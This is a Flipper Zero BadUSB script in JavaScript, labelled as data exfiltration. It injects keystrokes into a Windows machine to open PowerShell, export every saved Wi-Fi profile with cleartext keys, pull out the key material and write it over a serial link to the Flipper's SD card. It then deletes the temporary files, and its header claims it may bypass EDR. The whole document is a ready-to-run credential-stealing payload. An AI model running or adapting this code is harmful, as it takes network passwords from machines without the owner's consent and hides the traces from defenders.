// Title: Save Wifi To Flipper via Serial (adapted to JS)
// Author: emptythevoid and LupusE
// Credit to Gas Station Hot Dog for improvements in filename generation
// Target: Windows 10, Windows 11
// Version: 1.2
// Category: Data Exfiltration
// Desc: This script exfiltrates wifi profiles using export command by theb0ne
// the Flipper by it's serial interface, which may bypass EDR
// By default, data is stored on the Flipper in the apps_data folder

let badusb = require("badusb");
let notify = require("notification");
let flipper = require("flipper");
let dialog = require("dialog");

badusb.setup({ vid: 0x1234, pid: 0x1234, mfr_name: "Flipper", prod_name: "Zero" });
dialog.message("Save to Flipper Serial", "Press OK to start");

if (badusb.isConnected()) {
    notify.blink("green", "short");

    badusb.press("GUI", "r");
    delay(500);
    
    badusb.println("powershell");
    delay(750);
    //badusb.println("$d=(Get-ComputerInfo|Out-String);");
    badusb.println('New-Item -Path $env:temp -Name "js2k3kd4nne5dhsk" -ItemType "directory"; Set-Location -Path "$env:temp/js2k3kd4nne5dhsk"; netsh wlan export profile key=clear;') // Exports key material to temp directory in user's profile
    badusb.println('$d=Select-String -Path *.xml -Pattern "keyMaterial"|Out-String;') // Command to extract just the key material and save to $d
    badusb.println('$SUSB="USB\\\VID_0483&PID_5740";'); // the device ID of the Flipper.  
    badusb.println('$SPATH="/ext/apps_data/exfil_data${env:computername}.txt";'); // path on the Flipper SD card to store data
    
    // Command to have powershell wait for Flipper to exit badUSB mode, identify which COM port it's connected to, and open a serial connection and write contents of $d.
    // It will remove the temp information created earlier
    badusb.println('1..600|%{Try{$p=New-Object System.IO.Ports.SerialPort("COM$(Get-PNPDevice -PresentOnly | Where{$_.InstanceID -match $SUSB -and $_.Class -eq "Ports"} | % name | select-string \d+ | % { $_.matches.value })",230400,"None",8,"one");$p.open();$p.Write("storage write $SPATH `r`n");$p.Write($d);$p.Write("$([char] 3)");$p.Close();cd..;Remove-Item $env:temp/js2k3kd4nne5dhsk -Recurse;exit}Catch{Sleep 1}}');

    badusb.quit();

    

    notify.success();
} else {
    print("USB not connected");
    notify.error();
}
